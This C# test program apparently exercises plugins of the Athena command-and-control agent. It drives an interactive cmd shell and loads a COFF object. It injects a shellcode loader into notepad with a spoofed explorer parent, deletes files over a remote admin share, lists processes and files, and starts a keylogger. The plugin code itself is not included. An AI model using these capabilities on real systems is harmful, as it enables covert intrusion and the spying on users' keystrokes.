using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.Loader;
using System.Linq;
using System.Text;
using Athena.Commands.Models;
using System.Runtime.Serialization;
using Newtonsoft.Json;
using Plugins;
using Athena.Commands;
using Athena.Utilities;
using System.Threading.Tasks;
using Athena.Models.Comms.Tasks;

namespace TestPluginLoader
{
    class Program
    {
        public static Dictionary<string, Assembly> loadedcommands = new Dictionary<string, Assembly>();
        public static AssemblyLoadContext loadcontext = new AssemblyLoadContext("commands");
        static async Task Main(string[] args)
        {
            await TestInteractiveShell();
            //Console.WriteLine("Starting Keylogger.");
            //await TestLs();
            //var res = await TaskResponseHandler.GetTaskResponsesAsync();
            //Console.WriteLine(res.FirstOrDefault());
            //Console.WriteLine("Finished.");
            //Console.ReadKey();
        }

        static async Task TestInteractiveShell()
        {
            IPlugin plug = new InteractiveShell();
            Dictionary<string, string> parameters = new Dictionary<string, string>();
            parameters.Add("executable", @"C:\Windows\System32\cmd.exe");
            parameters.Add("task-id", "1");
            plug.Start(parameters);
            //Wait for process to finish starting
            System.Threading.Thread.Sleep(4000);

            //Send whoami.exe to process
            //Console.WriteLine("server 8.8.8.8");
            InteractiveMessage im = new InteractiveMessage()
            {
                data = "bnNsb29rdXA=",
                message_type = MessageType.Input,
                task_id = "1"
            };
            System.Threading.Thread.Sleep(1000);

            plug.Interact(im);

            System.Threading.Thread.Sleep(1000);
            //Console.WriteLine("google.com");
            im = new InteractiveMessage()
            {
                data = "c2VydmVyIDguOC44Ljg=",
                message_type = MessageType.Input,
                task_id = "1"
            };

            plug.Interact(im);
            System.Threading.Thread.Sleep(1000);
            im = new InteractiveMessage()
            {
                data = "",
                message_type = MessageType.CtrlC,
                task_id = "1"
            };

            plug.Interact(im); 
            System.Threading.Thread.Sleep(1000);

            im = new InteractiveMessage()
            {
                data = "d2hvYW1pCg==",
                message_type = MessageType.Input,
                task_id = "1"
            };

            plug.Interact(im);

            System.Threading.Thread.Sleep(100000);
        }

        static async Task TestCoff()
        {
            Dictionary<string, string> parameters = new Dictionary<string, string>();
            parameters.Add("asm", Misc.Base64Encode(File.ReadAllBytes(@"C:\Users\scott\Downloads\whoami.x64.o")));
            parameters.Add("functionName", "go");
            parameters.Add("arguments","");
            parameters.Add("timeout", "30");

            parameters.Add("task-id", "1");
            new Coff().Start(parameters);
            var res = await TaskResponseHandler.GetTaskResponsesAsync();
            Console.WriteLine(res.FirstOrDefault());
        }

        static async Task TestShellcodeInject()
        {
            string json = "{\"blockDlls\":false , \"output\":false}";

            Dictionary<string, string> parameters = Misc.ConvertJsonStringToDict(json);

            //Dictionary<string, string> parameters = new Dictionary<string, string>();
            //parameters.Add("asm", Misc.Base64Encode(File.ReadAllBytes(@"C:\Users\scott\Downloads\Seatbelt\Seatbelt.bin")));
            System.Diagnostics.Process[] p = System.Diagnostics.Process.GetProcessesByName("explorer");
            parameters.Add("asm", Misc.Base64Encode(File.ReadAllBytes(@"C:\Users\scott\Downloads\donut\loader.bin")));
            parameters.Add("arguments", "");
            parameters.Add("processName", "notepad.exe");
            parameters.Add("parent", p.FirstOrDefault().Id.ToString());
            parameters.Add("blockdlls", "true");
            //parameters.Add("functionName", "go");
            //parameters.Add("timeout", "60");
            parameters.Add("task-id", "1");
            IPlugin plugin = new InjectShellcode();

            plugin.Start(parameters);

            var res = await TaskResponseHandler.GetTaskResponsesAsync();
            Console.WriteLine(res.FirstOrDefault());
        }
        static async Task TestRm()
        {
            Dictionary<string, string> parameters = new Dictionary<string, string>();
            parameters.Add("host", "mydesktop");
            parameters.Add("path", @"C$\Users\scott\Downloads\");
            parameters.Add("file", "test.txt");
            parameters.Add("task-id", "1");
            new Rm().Start(parameters);
            var res = await TaskResponseHandler.GetTaskResponsesAsync();
            Console.WriteLine(res.FirstOrDefault());
        }

        static async Task TestLs()
        {
            //string json = """{"path": "Users\\scott\\source\\repos\\Athena\\athena", "host": "DESKTOP-GRJNOH2"}""";
            string json = """{"path": "C:\\users\\scott\\", "host": "127.0.0.1"}""";
            Dictionary<string, string> parameters = Misc.ConvertJsonStringToDict(json);
            parameters.Add("task-id", "1");
            IPlugin plug = new Ls();

            plug.Start(parameters);
            var res = await TaskResponseHandler.GetTaskResponsesAsync();
            Console.WriteLine(res.FirstOrDefault());

        }

        static async Task TestPs()
        {
            Dictionary<string, string> parameters = new Dictionary<string, string>();
            parameters.Add("task-id", "1");
            new Ps().Start(parameters);
            var res = await TaskResponseHandler.GetTaskResponsesAsync();
            Console.WriteLine(res.FirstOrDefault());
        }

        static async Task TestKeylogger()
        {
            Dictionary<string, string> parameters = new Dictionary<string, string>();
            parameters.Add("task-id", "1");
            new Keylogger().Start(parameters);
        }
    }
}
